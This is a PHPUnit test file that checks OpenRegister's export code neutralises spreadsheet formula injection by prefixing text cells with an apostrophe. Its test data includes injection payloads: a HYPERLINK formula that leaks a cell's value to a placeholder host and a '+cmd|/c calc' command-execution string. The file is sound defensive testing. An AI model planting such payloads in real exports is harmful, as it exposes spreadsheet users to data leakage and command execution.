<?php

/**
 * Exported text never becomes a spreadsheet formula.
 *
 * @category Tests
 * @package  OCA\OpenRegister\Tests\Unit\Service\Export
 *
 * @author    Conduction Development Team <info@conduction.nl>
 * @copyright 2026 Conduction B.V.
 * @license   EUPL-1.2 https://joinup.ec.europa.eu/collection/eupl/eupl-text-eupl-12
 *
 * SPDX-License-Identifier: EUPL-1.2
 * SPDX-FileCopyrightText: 2026 Conduction B.V. <info@conduction.nl>
 *
 * @link https://OpenRegister.app
 *
 * @spec openspec/specs/data-import-export/spec.md
 */

declare(strict_types=1);

namespace OCA\OpenRegister\Tests\Unit\Service\Export;

// phpcs:disable PEAR.Commenting.FunctionComment.Missing -- arrange/act/assert PHPUnit conventions.
// phpcs:disable CustomSniffs.Functions.NamedParameters.RequireNamedParameters -- PHPUnit positional assertions.

use OCA\OpenRegister\Search\Service\Reporting\ReportContent;
use OCA\OpenRegister\Search\Service\Reporting\SpreadsheetReportWriter;
use OCA\OpenRegister\Service\Export\SpreadsheetCell;
use OCA\OpenRegister\Service\Import\ImportErrorsCsv;
use PhpOffice\PhpSpreadsheet\Cell\DataType;
use PhpOffice\PhpSpreadsheet\IOFactory;
use PhpOffice\PhpSpreadsheet\Spreadsheet;
use PhpOffice\PhpSpreadsheet\Writer\Csv;
use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\TestCase;

/**
 * @covers \OCA\OpenRegister\Service\Export\SpreadsheetCell
 * @uses \OCA\OpenRegister\Search\Service\Reporting\ReportContent
 * @uses \OCA\OpenRegister\Search\Service\Reporting\SheetHeading
 * @uses \OCA\OpenRegister\Search\Service\Reporting\SpreadsheetReportWriter
 * @uses \OCA\OpenRegister\Service\Import\ImportErrorsCsv
 */
class SpreadsheetCellTest extends TestCase {

	/**
	 * @return array<string, array{0: mixed, 1: mixed}>
	 */
	public static function csvValues(): array {
		return [
			'equals' => ['=HYPERLINK("https://x/?"&A2,"open")', '\'=HYPERLINK("https://x/?"&A2,"open")'],
			'plus' => ['+cmd|/c calc', "'+cmd|/c calc"],
			'minus' => ['-2+3', "'-2+3"],
			'at' => ['@SUM(A1)', "'@SUM(A1)"],
			'tab' => ["\t=1", "'\t=1"],
			'carriage return' => ["\r=1", "'\r=1"],
			'plain text' => ['Jansen', 'Jansen'],
			'empty' => ['', ''],
			'negative number text' => ['-12.5', '-12.5'],
			'integer' => [-3, -3],
			'null' => [null, null],
		];
	}//end csvValues()

	#[DataProvider('csvValues')]
	public function testCsvValue(mixed $value, mixed $expected): void {
		$this->assertSame($expected, SpreadsheetCell::csvValue(value: $value));
	}//end testCsvValue()

	public function testSetStoresFormulaTextAsAString(): void {
		$sheet = (new Spreadsheet())->getActiveSheet();
		SpreadsheetCell::set(sheet: $sheet, coordinate: 'A1', value: '=1+1');
		SpreadsheetCell::set(sheet: $sheet, coordinate: 'A2', value: '42');
		SpreadsheetCell::set(sheet: $sheet, coordinate: 'A3', value: 7);

		$this->assertSame(DataType::TYPE_STRING, $sheet->getCell('A1')->getDataType());
		$this->assertSame('=1+1', $sheet->getCell('A1')->getValue());
		$this->assertSame(DataType::TYPE_NUMERIC, $sheet->getCell('A2')->getDataType());
		$this->assertSame(DataType::TYPE_NUMERIC, $sheet->getCell('A3')->getDataType());
	}//end testSetStoresFormulaTextAsAString()

	public function testForCsvPrefixesEveryTextCell(): void {
		$book  = new Spreadsheet();
		$sheet = $book->getActiveSheet();
		SpreadsheetCell::set(sheet: $sheet, coordinate: 'A1', value: '=1+1');
		SpreadsheetCell::set(sheet: $sheet, coordinate: 'B1', value: '@x');
		SpreadsheetCell::set(sheet: $sheet, coordinate: 'C1', value: 'ok');

		ob_start();
		(new Csv(SpreadsheetCell::forCsv(spreadsheet: $book)))->save('php://output');
		$csv = (string)ob_get_clean();

		$this->assertSame("\"'=1+1\",\"'@x\",\"ok\"", trim($csv));
	}//end testForCsvPrefixesEveryTextCell()

	public function testReportWorkbookKeepsATitleAsText(): void {
		$content = new ReportContent(['titel' => '=HYPERLINK("https://x","open")'], []);
		$bytes   = (new SpreadsheetReportWriter())->write($content, 'xlsx');
		$path    = tempnam(sys_get_temp_dir(), 'or-cell-') . '.xlsx';
		file_put_contents($path, $bytes);
		try {
			$cell = IOFactory::createReader('Xlsx')->load($path)->getSheet(0)->getCell('A1');
		} finally {
			unlink($path);
		}

		$this->assertNotSame(DataType::TYPE_FORMULA, $cell->getDataType());
		$this->assertStringContainsString("\"'=HYPERLINK", (new SpreadsheetReportWriter())->write($content, 'csv'));
	}//end testReportWorkbookKeepsATitleAsText()

	public function testImportErrorReportPrefixesAnOriginalValue(): void {
		$csv = (new ImportErrorsCsv())->render(
			['Personen' => ['errors' => [['row' => 3, 'field' => 'naam', 'error' => 'Invalid', 'original_value' => '=1+1']]]]
		);

		$this->assertStringContainsString("'=1+1", $csv);
	}//end testImportErrorReportPrefixesAnOriginalValue()
}//end class
